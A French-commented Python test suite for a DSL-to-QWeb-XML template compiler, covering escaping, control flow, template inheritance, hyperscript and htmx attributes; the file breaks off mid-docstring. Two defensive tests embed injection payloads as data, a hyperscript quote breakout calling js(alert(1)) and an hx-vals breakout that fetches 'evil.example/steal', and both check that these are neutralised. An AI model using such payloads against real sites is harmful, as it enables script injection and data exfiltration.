"""Tests du compiler xdsl → XML QWeb.

Valide le mapping complet défini dans `docs/dsl-design.md` :
chaque sorti DSL doit être identique à l'XML QWeb équivalent.
"""

import re
import textwrap
from pathlib import Path

import pytest

from xdsl.api import compile_dsl
from xdsl.compiler import Compiler, _to_qweb_interp, build_import_scope
from xdsl.parser import (
    Import,
    ParseError,
    Parser,
)
from xweb.engine.registry import QwebRegistry


def compile(source: str, package_id: str = "__plugin__") -> str:
    """Compile du xdsl et retourne l'XML normalisé."""
    parser = Parser(textwrap.dedent(source))
    ast = parser.parse()
    compiler = Compiler(ast, package_id=package_id)
    return compiler.compile()


def normalize(xml: str) -> str:
    """Compresse l'XML en une seule ligne, supprime les espaces autour des balises."""
    s = re.sub(r"\s+", " ", xml).strip()
    # Supprime les espaces entre balises et contenu
    s = re.sub(r">\s+", ">", s)
    s = re.sub(r"\s+<", "<", s)
    return s


def assert_xml_contains(xml: str, fragment: str) -> None:
    """Vérifie qu'un fragment XML est présent dans la sortie (whitespace-insensitive)."""
    assert fragment in normalize(xml), (
        f"Expected fragment:\n{fragment}\n\nActual (normalized):\n{normalize(xml)}"
    )


def assert_xml_not_contains(xml: str, fragment: str) -> None:
    assert fragment not in normalize(xml), (
        f"Did not expect fragment:\n{fragment}\n\nActual (normalized):\n{normalize(xml)}"
    )


def _compile_one(source: str) -> str:
    """Compile un snippet DSL sans component/patch wrapper et retourne l'XML."""
    return compile(textwrap.dedent(source))


# =============================================================================
# Test build_import_scope
# =============================================================================


class TestImportScope:
    def test_absolute_import(self):
        imp = Import(names=["button", "input"], source="xweb")
        scope = build_import_scope([imp], "auth")
        assert scope["button"] == "xweb.button"
        assert scope["input"] == "xweb.input"

    def test_relative_same_plugin(self):
        imp = Import(names=["nav"], source="./", relative=True)
        scope = build_import_scope([imp], "my_plugin")
        assert scope["nav"] == "my_plugin.nav"

    def test_relative_up_one(self):
        imp = Import(names=["helper"], source="../auth", relative=True)
        scope = build_import_scope([imp], "my_plugin")
        assert scope["helper"] == "auth.helper"


# =============================================================================
# Template : component + t-name
# =============================================================================


class TestTemplateBasic:
    def test_empty_component(self):
        xml = compile('component test { }')
        assert_xml_contains(xml, '<template t-name="test">')
        assert_xml_contains(xml, "</template>")

    def test_dotted_component_name(self):
        xml = compile('component xweb.card { }')
        assert_xml_contains(xml, '<template t-name="xweb.card">')

    def test_component_with_props(self):
        xml = compile(
            """
            component test {
                props: { label: "default" }
                span { label }
            }
            """
        )
        assert '<t t-set="label"' in xml
        assert '<t t-esc="label"/>' in xml


# =============================================================================
# Style : style: "..."
# =============================================================================


class TestStyle:
    def test_style_block(self):
        xml = compile(
            """
            component auth.login {
                style: ".login { padding: 2rem; }"

                div { class: "login" }
            }
            """
        )
        assert_xml_contains(xml, "<style>")
        assert ".login { padding: 2rem; }" in xml
        assert "</style>" in xml


# =============================================================================
# Props
# =============================================================================


class TestProps:
    def test_props_default_string(self):
        xml = compile(
            """
            component test {
                props: { label: "Connexion" }
            }
            """
        )
        assert_xml_contains(xml, '<t t-set="label" t-default="\'Connexion\'"/>')

    def test_props_default_number(self):
        xml = compile(
            """
            component test {
                props: { count: 0 }
            }
            """
        )
        assert_xml_contains(xml, '<t t-set="count" t-default="0"/>')

    def test_props_default_bool(self):
        xml = compile(
            """
            component test {
                props: { active: true }
            }
            """
        )
        assert_xml_contains(xml, '<t t-set="active" t-default="true"/>')


class TestCallPropEscaping:
    """Régression réelle (trouvée en écrivant site/templates/syntax.dsl) : la
    prop LITTÉRALE d'un t-call était le seul chemin d'émission d'attribut du
    compilateur qui n'échappait rien — `card { title: "un <template>" }`
    produisait `t-att-title="'un <template>'"`, un XML invalide qui faisait
    planter lxml à l'ENREGISTREMENT, avec un message pointant la ligne du XML
    compilé plutôt que celle du .dsl source."""

    def test_angle_brackets_in_call_prop_produce_valid_xml(self):
        src = 'import { card } from "xweb"\ncomponent test { card { title: "un <template> ici" } }'
        xml = compile(src)
        assert "&lt;template&gt;" in xml
        assert "<template> ici" not in xml

    def test_ampersand_and_double_quote_in_call_prop(self):
        src = "import { card } from \"xweb\"\ncomponent test { card { title: 'a & \"b\"' } }"
        xml = compile(src)
        assert "&amp;" in xml
        assert "&quot;b&quot;" in xml

    def test_apostrophes_stay_readable(self):
        """Les apostrophes délimitent le littéral Python et sont valides dans
        un attribut délimité par `"` — les échapper marcherait aussi mais
        rendrait toute la sortie compilée illisible pour rien."""
        src = 'import { card } from "xweb"\ncomponent test { card { title: "simple" } }'
        assert "t-att-title=\"'simple'\"" in compile(src)

    def test_registers_and_renders_through_the_real_engine(self):
        """Le vrai palier : le bug ne se voyait qu'à l'enregistrement (lxml),
        pas à la compilation — un test qui ne compare que du texte compilé
        serait passé à côté."""
        src = 'import { card } from "xweb"\ncomponent test { card { title: "un <template> & \'autre\'" } }'
        reg = QwebRegistry()
        reg.register_dir(Path(__file__).parent.parent.parent / "xweb" / "components")
        reg.register_source(src, filename="escaping.dsl")
        html = reg.render("test", {})
        assert "&lt;template&gt;" in html


# =============================================================================
# Texte : littéral vs expression
# =============================================================================


class TestText:
    def test_literal_text_not_wrapped_in_t_esc(self):
        xml = compile(
            """
            component test {
                span { "Contacts" }
            }
            """
        )
        assert_xml_contains(xml, "<span>Contacts</span>")
        assert_xml_not_contains(xml, "t-esc=\"Contacts\"")

    def test_expression_text_wrapped_in_t_esc(self):
        xml = compile(
            """
            component test {
                span { item.name }
            }
            """
        )
        assert_xml_contains(xml, '<span><t t-esc="item.name"/></span>')

    def test_raw_text(self):
        xml = compile(
            """
            component test {
                div { raw slot }
            }
            """
        )
        assert_xml_contains(xml, '<t t-out="slot"/>')

    def test_tr_static(self):
        xml = compile(
            """
            component test {
                h1 { tr "Connexion" }
            }
            """
        )
        assert_xml_contains(xml, '<t t-tr="1">Connexion</t>')

    def test_tr_expression(self):
        xml = compile(
            """
            component test {
                p { tr name }
            }
            """
        )
        assert_xml_contains(xml, '<t t-out="tr(name)"/>')


# =============================================================================
# Slot
# =============================================================================


class TestSlot:
    def test_slot_node(self):
        xml = compile(
            """
            component xweb.card {
                div { class: "card-body"
                    slot
                }
            }
            """
        )
        assert_xml_contains(xml, '<t t-out="slot"/>')


# =============================================================================
# Import résolution → t-call
# =============================================================================


class TestImportResolution:
    def test_imported_component_produces_t_call(self):
        xml = compile(
            """
            component auth.login {
                import { button } from "xweb"

                button { label: "Connexion" }
            }
            """,
            package_id="auth",
        )
        assert_xml_contains(xml, '<t t-call="xweb.button"')
        assert 't-att-label="\'Connexion\'"' in xml

    def test_imported_with_variant(self):
        xml = compile(
            """
            component test {
                import { button } from "xweb"

                button { label: "OK"; variant: "primary" }
            }
            """
        )
        assert_xml_contains(xml, '<t t-call="xweb.button"')
        assert 't-att-variant="\'primary\'"' in xml

    def test_imported_with_hx_static(self):
        xml = compile(
            """
            component test {
                import { button } from "xweb"

                button { label: "OK"; hx-post: "/save" }
            }
            """
        )
        assert_xml_contains(xml, 'hx-post="/save"')
        assert 't-att-label="\'OK\'"' in xml

    def test_imported_with_class(self):
        xml = compile(
            """
            component test {
                import { button } from "xweb"

                button { label: "OK"; class: "flex gap-2" }
            }
            """
        )
        # class: -> extra_class (convention xweb — class est un mot-clé
        # réservé Python, {{class}} serait une SyntaxError côté cible)
        assert 't-attf-extra_class="flex gap-2"' in xml

    def test_imported_with_boolean_prop(self):
        xml = compile(
            """
            component test {
                import { button } from "xweb"

                button { label: "OK"; disabled: true }
            }
            """
        )
        # true → True (Python bool literal) pour que QWeb puisse l'évaluer
        assert 't-att-disabled="True"' in xml

    def test_imported_relative(self):
        xml = compile(
            """
            component crm.main {
                import { nav } from "./"

                nav { }
            }
            """,
            package_id="crm_app",
        )
        assert '<t t-call="crm_app.nav"/>' in xml

    def test_imported_relative_up(self):
        xml = compile(
            """
            component crm.main {
                import { helper } from "../auth"

                helper { }
            }
            """,
            package_id="crm_app",
        )
        assert '<t t-call="auth.helper"/>' in xml

    def test_imported_with_children(self):
        xml = compile(
            """
            component test {
                import { button } from "xweb"

                button { label: "OK"
                    span { "inner" }
                }
            }
            """
        )
        assert_xml_contains(xml, '<t t-call="xweb.button"')
        assert_xml_contains(xml, "<span>inner</span>")
        assert_xml_contains(xml, "</t>")


# =============================================================================
# Éléments HTML littéraux
# =============================================================================


class TestRawHtmlElements:
    def test_simple_element(self):
        xml = compile(
            """
            component test {
                div { class: "container" }
            }
            """
        )
        assert_xml_contains(xml, '<div class="container"/>')

    def test_element_with_children(self):
        xml = compile(
            """
            component test {
                div { class: "container"
                    h1 { "Titre" }
                }
            }
            """
        )
        assert_xml_contains(xml, '<div class="container">')
        assert_xml_contains(xml, "<h1>Titre</h1>")
        assert_xml_contains(xml, "</div>")

    def test_void_element(self):
        xml = compile(
            """
            component test {
                input { type: "text"; name: "email" }
            }
            """
        )
        assert_xml_contains(xml, '<input type="text" name="email"/>')

    def test_hx_on_raw_element(self):
        xml = compile(
            """
            component test {
                div { hx-get: "/data"; hx-target: "#result" }
            }
            """
        )
        assert 'hx-get="/data"' in xml
        assert 'hx-target="#result"' in xml

    def test_hx_dynamic_on_raw_element(self):
        xml = compile(
            """
            component test {
                div { hx-post: url }
            }
            """
        )
        assert 't-att-hx-post="url"' in xml

    def test_style_as_attribute(self):
        xml = compile(
            """
            component test {
                div { style: "color: red" }
            }
            """
        )
        assert 'style="color: red"' in xml


# =============================================================================
# Structures de contrôle
# =============================================================================


class TestControlStructures:
    def test_if(self):
        xml = compile(
            """
            component test {
                if (active) {
                    span { "On" }
                }
            }
            """
        )
        assert_xml_contains(xml, 't-if="active"')
        assert_xml_contains(xml, '<span>On</span>')

    def test_if_elif_else_sibling_form(self):
        """BUG régression : le compileur émettait une seule </t> finale pour
        toute la chaîne if/elif/else (fratrie non fermée) → XML malformé.
        L'engine (xweb/engine/compiler.py) résout les chaînes par balayage
        de siblings : chaque branche doit être une <t> fermée autonome."""
        xml = compile(
            """
            component test {
                if (active) {
                    span { "On" }
                } elif (other) {
                    span { "Mid" }
                } else {
                    span { "Off" }
                }
            }
            """
        )
        assert_xml_contains(xml, '<t t-if="active"><span>On</span></t>')
        assert_xml_contains(xml, '<t t-elif="other"><span>Mid</span></t>')
        assert_xml_contains(xml, '<t t-else="1"><span>Off</span></t>')
        # Trois branches = trois </t> autonomes, pas un seul final
        assert xml.count("</t>") >= 3

    def test_for(self):
        xml = compile(
            """
            component test {
                for item in items {
                    div { item.name }
                }
            }
            """
        )
        assert 't-foreach="items"' in xml
        assert 't-as="item"' in xml
        assert '<t t-esc="item.name"/>' in xml

    def test_assignment(self):
        xml = compile(
            """
            component test {
                x = expr
            }
            """
        )
        assert '<t t-set="x" t-value="expr"/>' in xml

    def test_assignment_default(self):
        xml = compile(
            """
            component test {
                x ?= expr
            }
            """
        )
        assert '<t t-set="x" t-default="expr"/>' in xml

    def test_assignment_string_literal_python_quoted(self):
        """BUG régression : `x = "texte"` émettait t-value="texte" — le lexer
        déquote les STRING, l'expression n'était plus du Python valide et
        l'engine (eval sans builtins) levait NameError au rendu."""
        xml = compile(
            """
            component test {
                x = "bonjour"
            }
            """
        )
        assert '<t t-set="x" t-value="&quot;bonjour&quot;"/>' in xml

    def test_assignment_boolean_python_quoted(self):
        xml = compile(
            """
            component test {
                x = true
            }
            """
        )
        assert '<t t-set="x" t-value="True"/>' in xml

    def test_arithmetic_operators_preserved(self):
        """BUG régression : le lexer ignorait les caractères inconnus (+ -* %),
        `price + tax` devenait `price tax` et l'expression était invalide."""
        xml = compile(
            """
            component test {
                total = price + tax - rebate * 2 / items % 10
            }
            """
        )
        assert '<t t-set="total" t-value="price + tax - rebate * 2 / items % 10"/>' in xml

    def test_comparison_operators_preserved(self):
        """Les comparaisons `< > <= >= !=` (et `==`) doivent traverser le
        parse sans corruption : le lexer avalait silencieusement `<`, `>`,
        `!`, produisant `x 5`, `x 5`, `x = 5` sans erreur ni avertissement."""
        xml = compile(
            """
            component test {
                if (x < 5) { p { "petit" } }
                elif (x >= 10) { p { "grand" } }
                else { p { "moyen" } }
                v = y != 3
                w = z <= 2
                q = a == b
            }
            """
        )
        assert '<t t-if="x &lt; 5">' in xml
        assert '<t t-elif="x &gt;= 10">' in xml
        assert '<t t-set="v" t-value="y != 3"/>' in xml
        assert '<t t-set="w" t-value="z &lt;= 2"/>' in xml
        assert '<t t-set="q" t-value="a == b"/>' in xml

    def test_ternary_in_attribute_value(self):
        """Ternaire `cond ? a : b` dans une valeur d'attribut → Python
        `a if (cond) else b` (évalué par eval dans le moteur). L'exemple du
        design doc (docs/dsl-design.md) doit compiler."""
        xml = compile(
            """
            component test {
                div { variant: contact.role == "admin" ? "primary" : "ghost" }
            }
            """
        )
        assert (
            't-att-variant="&quot;primary&quot; if (contact.role == &quot;admin&quot;) '
            'else &quot;ghost&quot;"' in xml
        )

    def test_ternary_in_class_list(self):
        """Ternaire dans un item de `class: [...]` — la branche d'un
        ternaire ne peut pas être un IDENT suivi de `:` (le séparateur
        ternaire), sinon l'heuristique "ident suivi de colon = attribut
        suivant" court-circuiterait la lecture."""
        xml = compile(
            """
            component test {
                span { class: ["badge", status == "ok" ? "badge-success" : "badge-error"] }
            }
            """
        )
        assert (
            't-attf-class="badge {{&quot;badge-success&quot; if (status == &quot;ok&quot;) '
            'else &quot;badge-error&quot;}}"' in xml
        )

    def test_ternary_in_assignment(self):
        """Ternaire dans une assignation avec des branches IDENT (pas de
        quote — cas où l'heuristique _ident_followed_by_colon mordait sur la
        branche vraie et faisait échouer `_expect(COLON)`)."""
        xml = compile(
            """
            component test {
                v = q ? a : b
            }
            """
        )
        assert '<t t-set="v" t-value="a if (q) else b"/>' in xml

    def test_ternary_nested_parens_rejected(self):
        """Ternaire dans des parenthèses (ou imbrication directe sans
        parens) → ParseError claire, jamais une corruption silencieuse."""
        for src in (
            'v = (a ? b : c)\n',
            "v = a ? b ? c : d : e\n",
        ):
            with pytest.raises(ParseError, match="Ternaire"):
                Parser(f"component test {{\n    {src}}}", "test.dsl").parse()

    def test_compound_literal_keeps_string_keys(self):
        """Les dicts/listes déclarés en assignation (données de boucles)
        doivent rester des littéraux Python valides une fois requis en
        t-value : clés et valeurs string re-quotées."""
        xml = compile(
            """
            component test {
                items = [{"label": "Admin", "count": 3}, {"label": "Éditeur"}]
            }
            """
        )
        assert 't-value="[{ &quot;label&quot; : &quot;Admin&quot;' in xml
        unescaped = xml.replace("&quot;", '"')
        for key in ('"label"', '"Admin"', '"count"', '"Éditeur"'):
            assert key in unescaped, f"clé/valeur {key} perdue dans le littéral"

    def test_string_comparison_in_condition_kept_quoted(self):
        """Les comparaisons avec littéral string (if member['role'] == 'admin')
        doivent garder les quotes — t-if évalué par eval Python."""
        xml = compile(
            """
            component test {
                if (member["role"] == "admin") {
                    p { "Oui" }
                }
            }
            """
        )
        assert '<t t-if="member[&quot;role&quot;]== &quot;admin&quot;">' in xml


# =============================================================================
# Patch
# =============================================================================


class TestPatch:
    def test_simple_patch(self):
        xml = compile(
            """
            patch xweb.form {
                xpath "//button" {
                    inside: span { "CGU" }
                }
            }
            """
        )
        assert_xml_contains(xml, 't-inherit="xweb.form"')
        assert_xml_contains(xml, 't-inherit-mode="extension"')
        assert_xml_contains(xml, 'expr="//button"')
        assert_xml_contains(xml, 'position="inside"')
        assert_xml_contains(xml, "<span>CGU</span>")

    def test_patch_with_priority(self):
        xml = compile(
            """
            patch xweb.form priority: 10 {
                xpath "//button" {
                    inside: span { "Premium" }
                }
            }
            """
        )
        assert 'priority="10"' in xml


# =============================================================================
# Copy (primary)
# =============================================================================


class TestCopy:
    """`copy source as alias { xpath ... }` — voir CopyDef/inherit.py.

    Seule la forme xpath est acceptée : xweb/engine/inherit.py::
    extract_patch() ne lit que les enfants <xpath> d'un template
    t-inherit-mode="primary", tout le reste du corps serait silencieusement
    ignoré au rendu — bug réel trouvé en enregistrant une vraie copie pour
    la première fois (voir TestCopyEndToEnd, qui couvre précisément ce
    qu'un test texte-seulement ne peut pas attraper)."""

    def test_simple_copy(self):
        xml = compile(
            """
            copy xweb.button as demo.fancy_button {
                xpath "//button" { inside: span { "★" } }
            }
            """
        )
        assert 't-name="demo.fancy_button"' in xml
        assert 't-inherit="xweb.button"' in xml
        assert 't-inherit-mode="primary"' in xml
        assert 'expr="//button"' in xml
        assert 'position="inside"' in xml
        assert_xml_contains(xml, "<span>★</span>")

    def test_literal_body_is_rejected_not_silently_ignored(self):
        """L'ancienne syntaxe (`copy ... { div { ... } }`, corps littéral)
        compilait un XML valide qui s'enregistrait sans erreur mais dont
        le contenu n'avait AUCUN effet au rendu — pire qu'un ParseError,
        parce que silencieux. Elle doit maintenant être refusée au parse."""
        with pytest.raises(ParseError, match="uniquement.*xpath|xpath"):
            compile(
                """
                copy xweb.button as demo.x {
                    div { "contenu perdu silencieusement avant ce correctif" }
                }
                """
            )

    def test_attributes_position_emits_attribute_tag_not_a_element(self):
        """xweb/engine/inherit.py::extract_patch lit exclusivement des
        <attribute name="X">Y</attribute> pour position="attributes" —
        jamais un élément <a X="Y"/> (ce que le compilateur générait avant
        ce correctif, enregistré sans erreur mais sans le moindre effet :
        `xp.findall("attribute")` ne voit tout simplement pas un <a/>)."""
        xml = compile(
            """
            copy xweb.button as demo.x {
                xpath "//button" { attributes: a { data-tracked: "true" } }
            }
            """
        )
        assert '<attribute name="data-tracked">true</attribute>' in xml
        assert "<a " not in xml


class TestCopyEndToEnd:
    """Preuve bout-en-bout (vrai QwebRegistry, vrai rendu) que `copy` ET
    `patch` appliqués sur la copie ont un effet RÉEL — le seul niveau où
    le bug ci-dessus (copie littérale = silencieusement morte) pouvait se
    voir ; les tests texte-seul de TestCopy ne l'auraient jamais attrapé."""

    def _register(self, source: str) -> QwebRegistry:
        xml = compile(textwrap.dedent(source))
        reg = QwebRegistry()
        reg.register_dir(Path(__file__).parent.parent.parent / "xweb" / "components")
        reg.register_source(f"<templates>\n{xml}\n</templates>", filename="<test>")
        reg.check_all()
        return reg

    def test_copy_xpath_customization_actually_renders(self):
        reg = self._register("""
            copy xweb.button as demo.fancy_button {
                xpath "//button" { attributes: a { data-fancy: "1" } }
            }
        """)
        html = reg.render("demo.fancy_button", {"slot": "Cliquez"})
        assert 'data-fancy="1"' in html

    def test_patch_on_a_copy_also_applies(self):
        """La question posée en construisant ce test : peut-on `copy` puis
        `patch` la copie ? Oui — une fois enregistrée, une copie est un
        template comme un autre, `patch` la cible par son NOM (`demo.
        fancy_button`), sans distinction avec un template de base."""
        reg = self._register("""
            copy xweb.button as demo.fancy_button {
                xpath "//button" { attributes: a { data-fancy: "1" } }
            }
            patch demo.fancy_button {
                xpath "//button" { attributes: a { data-tracked: "true" } }
            }
        """)
        html = reg.render("demo.fancy_button", {"slot": "Cliquez"})
        assert 'data-fancy="1"' in html
        assert 'data-tracked="true"' in html


# =============================================================================
# Cas d'usage complets (design spec § Cas d'usage)
# =============================================================================


class TestIntegration:
    def test_boucle_design_example(self):
        """Design doc lines 128-144: boucle avec div class."""
        xml = compile(
            """
            component test {
                for item in items {
                    div { class: "row"
                        span { item.name }
                        span { item.email }
                    }
                }
            }
            """
        )
        assert_xml_contains(xml, '<t t-foreach="items" t-as="item">')
        assert_xml_contains(xml, '<div class="row">')
        assert_xml_contains(xml, '<t t-esc="item.name"/>')
        assert_xml_contains(xml, '<t t-esc="item.email"/>')

    def test_if_else_design_example(self):
        """Design doc lines 107-122: condition avec composant importé."""
        xml = compile(
            """
            component test {
                import { button } from "xweb"

                if (is_authenticated) {
                    button { label: "Déconnexion" }
                } else {
                    button { label: "Connexion" }
                }
            }
            """
        )
        assert 't-if="is_authenticated"' in xml
        assert 't-att-label="\'Déconnexion\'"' in xml
        assert 't-att-label="\'Connexion\'"' in xml

    def test_copy_with_priority_on_the_patch_applied_afterwards(self):
        """Cas d'usage réel (voir TestCopyEndToEnd) : une copie n'a de sens
        que combinée à un xpath qui la personnalise réellement — vérifié
        ici que priority reste disponible sur un patch qui cible ensuite
        cette copie, comme sur n'importe quel autre template."""
        xml = compile(
            """
            copy xweb.button as demo.fancy_button {
                xpath "//button" { attributes: a { data-fancy: "1" } }
            }
            patch demo.fancy_button priority: 5 {
                xpath "//button" { attributes: a { data-tracked: "true" } }
            }
            """
        )
        assert 't-name="demo.fancy_button"' in xml
        assert 't-inherit-mode="primary"' in xml
        assert 'priority="5"' in xml


# =============================================================================
# @include — layout marker
# =============================================================================


class TestInclude:
    def test_include_emits_layout_marker(self):
        xml = compile('@include "xweb.shell"\n')
        assert_xml_contains(xml, '<!-- layout: xweb.shell -->')

    def test_include_with_component(self):
        xml = compile(
            '''
            @include "xweb.shell"

            component test {
                span { "hello" }
            }
            '''
        )
        assert_xml_contains(xml, '<!-- layout: xweb.shell -->')
        assert_xml_contains(xml, '<template t-name="test">')

    def test_no_include_no_marker(self):
        xml = compile('component test { span { "hi" } }')
        assert_xml_not_contains(xml, "<!-- layout:")

    def test_include_shell_minimal(self):
        xml = compile('@include "xweb.shell_minimal"\n')
        assert_xml_contains(xml, '<!-- layout: xweb.shell_minimal -->')


# =============================================================================
# Hyperscript — attribut _ brut
# =============================================================================


class TestHyperscript:
    def test_inline(self):
        xml = compile('''
            component test {
                div {
                    _ : on click toggle .hidden on #modal
                }
            }
        ''')
        assert '_="on click toggle .hidden on #modal"' in xml

    def test_block_statements(self):
        xml = compile('''
            component test {
                div {
                    _ {
                        on load
                            wait 2s
                        on click remove me
                    }
                }
            }
        ''')
        # Le XML doit contenir _="..." ; les newlines internes sont conservées
        # (hyperscript sépare ses handlers par des sauts de ligne).
        assert '_="' in xml
        assert 'on load' in xml
        assert 'wait 2s' in xml
        assert 'on click remove me' in xml
        assert '\n' in xml

    def test_block_with_nested_braces(self):
        xml = compile('''
            component test {
                div {
                    _ {
                        js(me) return {a: 1} end
                    }
                }
            }
        ''')
        assert 'js(me) return {a: 1} end' in xml

    def test_component_call_with_hyperscript(self):
        xml = compile('''
            component test {
                import { button } from "xweb"

                button { label: "X"; _ : on click toggle .hidden }
            }
        ''')
        assert '_="on click toggle .hidden"' in xml

    def test_raw_element_angle_bracket_escaped(self):
        """Le < hyperscript est échappé &lt; dans l'XML, puis round-trip via lxml."""
        xml = compile('''
            component test {
                div {
                    _ : on mouseover if rect.bottom < 100 then log me
                }
            }
        ''')
        assert '&lt;' in xml
        assert '&gt;' not in xml

    def test_block_mode_server_interpolation(self):
        """${var} dans un script devient {{var}} + t-attf-_ : interpolation
        SERVEUR par QWeb au render (jamais littéral côté client)."""
        xml = compile(r'''
            component test {
                div {
                    _ {
                        on click call server `/api/items/${id}` then put it into #result
                    }
                }
            }
        ''')
        assert '${id}' not in xml
        # `id` est interpolé dans un attribut `_` (hyperscript) — le
        # compilateur chaîne le filtre `hs` (xweb/engine/filters.py) en plus
        # de l'échappement HTML normal : l'échappement HTML seul protège la
        # frontière HTML mais pas la chaîne hyperscript imbriquée à
        # l'intérieur (un guillemet redeviendrait un guillemet réel une fois
        # décodé par le navigateur et casserait le script — voir docstring
        # de `_hs`/`_CODE_ATTR_FILTERS`).
        assert 't-attf-_="on click call server `/api/items/{{(id) | hs}}` then put it into #result"' in xml

    def test_block_mode_no_interpolation_stays_static(self):
        """Sans ${}, le bloc reste un attribut statique _="..." brut."""
        xml = compile('''
            component test {
                div {
                    _ {
                        on click toggle .hidden on #modal
                    }
                }
            }
        ''')
        assert '_="on click toggle .hidden on #modal"' in xml
        assert 't-attf-_' not in xml

    def test_inline_mode_server_interpolation(self):
        """Le mode ligne accepte désormais ${...} (le } de fermeture n'est
        plus confondu avec l'accolade de l'élément). Compilé en t-attf-_."""
        xml = compile(r'''
            component test {
                button {
                    hx-post: "/like"
                    _ : on click log "Post ${post.id} aimé !"
                }
            }
        ''')
        # Même raisonnement que test_block_mode_server_interpolation : la
        # valeur interpolée dans `_` passe par le filtre `hs`.
        assert 't-attf-_="on click log &quot;Post {{(post.id) | hs}} aimé !&quot;"' in xml

    def test_hyperscript_interpolation_neutralizes_a_breakout_quote(self):
        """Preuve bout-en-bout : une valeur contenant un `"` ne referme plus
        la chaîne hyperscript prématurément — c'est exactement le scénario
        d'injection que le filtre `hs` corrige (docs/dsl-design.md, exemple
        `log "Post ${post.id} aimé !"`). Rendu réel via QwebRegistry, puis
        décodage des entités HTML — ce que ferait le navigateur avant de
        passer la chaîne au parseur hyperscript."""
        import html as html_mod
        import types

        from xweb.engine.registry import QwebRegistry

        xml = compile(r'''
            component test {
                div {
                    _ : on click log "Post ${post.id} aimé !"
                }
            }
        ''')
        registry = QwebRegistry()
        registry.register_source(xml, filename="<test>")
        evil = '" then js(alert(1)) end log "'
        rendered = registry.render("test", {"post": types.SimpleNamespace(id=evil)})
        attr_value = rendered.split('_="', 1)[1].split('"', 1)[0]
        decoded = html_mod.unescape(attr_value)
        # Sans le filtre `hs`, `decoded` serait :
        #   on click log "Post " then js(alert(1)) end log " aimé !"
        # — la valeur injectée referme la chaîne hyperscript après "Post ".
        # Avec `hs`, chaque guillemet injecté est précédé d'un antislash :
        # hyperscript le lit comme un guillemet échappé, pas une fermeture.
        assert decoded == (
            'on click log "Post \\" then js(alert(1)) end log \\" aimé !"'
        )


# =============================================================================
# hx-vals: "js:..." — même frontière imbriquée que `_`, filtre `js`
# =============================================================================


class TestHxValsInterpolation:
    """hx-vals est reparsé comme JSON/JS par htmx après décodage HTML — même
    raisonnement que `_`/hyperscript : une interpolation ${...} y est
    protégée par le filtre `js` (xweb/engine/filters.py::_js, json.dumps),
    en plus de l'échappement HTML normal de l'attribut."""

    def test_component_call_chains_js_filter(self):
        xml = compile('''
            import { button } from "xweb"
            component test {
                button { label: "X"; hx-post: "/save"; hx-vals: "js:{id: ${selected_id}}" }
            }
        ''')
        assert_xml_contains(
            xml, 't-attf-hx-vals="js:{id: {{(selected_id) | js}}}"'
        )

    def test_raw_element_chains_js_filter(self):
        xml = _compile_one('div { hx-vals: "js:{id: ${selected_id}}" }')
        assert_xml_contains(
            xml, 't-attf-hx-vals="js:{id: {{(selected_id) | js}}}"'
        )

    def test_other_hx_attrs_get_no_filter(self):
        """hx-post/hx-target/etc. ne sont pas reparsés comme du code par
        htmx (juste une URL/un sélecteur) — pas de filtre à y chaîner."""
        xml = _compile_one('div { hx-post: url; hx-target: "#${target_id}" }')
        assert_xml_contains(xml, 't-att-hx-post="url"')
        assert_xml_contains(xml, 't-attf-hx-target="#{{target_id}}"')
        assert "| js" not in xml
        assert "| hs" not in xml

    def test_js_filter_neutralizes_a_breakout_brace(self):
        """Preuve bout-en-bout : une valeur qui casserait l'objet JS littéral
        (accolade/guillemet) est rendue comme une chaîne JSON sûre — plus
        moyen de faire évaluer du JS arbitraire à htmx (`js:` prefix =
        évaluation dynamique de l'expression)."""
        import html as html_mod

        xml = compile('''
            component test {
                div { hx-vals: "js:{id: ${selected_id}}" }
            }
        ''')
        registry = QwebRegistry()
        registry.register_source(xml, filename="<test>")
        evil = "1}; fetch('https://evil.example/steal'); ({x: 1"
        rendered = registry.render("test", {"selected_id": evil})
        attr_value = rendered.split('hx-vals="', 1)[1].split('"', 1)[0]
        decoded = html_mod.unescape(attr_value)
        # json.dumps() quote/échappe la valeur entière — plus d'accolade ni
        # de point-virgule libres pour sortir de la position de valeur.
        assert decoded == 'js:{id: "1}; fetch(\'https://evil.example/steal\'); ({x: 1"}'


# =============================================================================
# Chaînage de filtre QWeb en expression NUE (hors ${...}) — `price | money`.
# Avant TokenKind.PIPE, le lexer ignorait `|` (caractère inconnu), donnant
# `t-att-label="price money"` : un eval() Python invalide.
# =============================================================================


class TestBareFilterChain:
    def test_no_arg_filter(self):
        xml = _compile_one('''
            import { badge } from "xweb"
            component test { badge { label: price | money } }
        ''')
        assert_xml_contains(xml, 't-att-label="price | money"')

    def test_filter_with_single_arg(self):
        xml = _compile_one('''
            import { badge } from "xweb"
            component test { badge { label: title | truncate:5 } }
        ''')
        # Le ':' qui suit un nom de filtre n'est plus un terminateur
        # d'expression — l'argument atterrit dans la même valeur d'attribut.
        assert "t-att-label=" in xml
        assert "truncate" in xml
        assert "5" in xml
        assert_xml_not_contains(xml, "t-att-title=")  # pas mangled en 2e attribut

    def test_chained_filters(self):
        xml = _compile_one('''
            import { badge } from "xweb"
            component test { badge { label: title | upper | truncate:5 } }
        ''')
        assert "upper" in xml and "truncate" in xml

    def test_next_attribute_on_same_line_still_parses(self):
        """Régression : un ':' de filtre ne doit pas avaler le ':' du
        VRAI attribut suivant sur la même ligne."""
        xml = _compile_one('''
            import { badge } from "xweb"
            component test { badge { label: price | money; variant: "primary" } }
        ''')
        assert_xml_contains(xml, "t-att-variant=\"'primary'\"")

    def test_filter_in_unquoted_class_list_item(self):
        xml = _compile_one('div { class: ["badge", price | money] }')
        assert_xml_contains(xml, 't-attf-class="badge {{price | money}}"')

    def test_filter_in_text_node(self):
        xml = _compile_one('span { item.price | money }')
        assert_xml_contains(xml, '<t t-esc="item.price | money"/>')

    def test_end_to_end_render_applies_the_filter(self):
        """Preuve bout-en-bout : le filtre s'applique vraiment au rendu,
        pas seulement dans le XML compilé."""
        import types

        xml = compile('component test { span { item.price | money } }')
        registry = QwebRegistry()
        registry.register_source(xml, filename="<test>")
        html = registry.render("test", {"item": types.SimpleNamespace(price=1234.5)})
        assert "1 234,50 €" in html

    def test_multi_arg_filter_is_a_documented_limitation(self):
        """Un filtre multi-arguments (virgule de premier niveau après le
        ':') N'EST PAS supporté en expression nue — ambigu avec un
        séparateur d'item de class:[...]/style:{...}. `_read_expression`
        s'arrête à la virgule (comme pour n'importe quelle expression nue),
        et ce qui suit ("city") n'est plus dans un contexte d'attribut
        valide → ParseError franche au compile, jamais un XML bancal
        silencieux. `${...}` reste la voie recommandée pour ce cas (texte
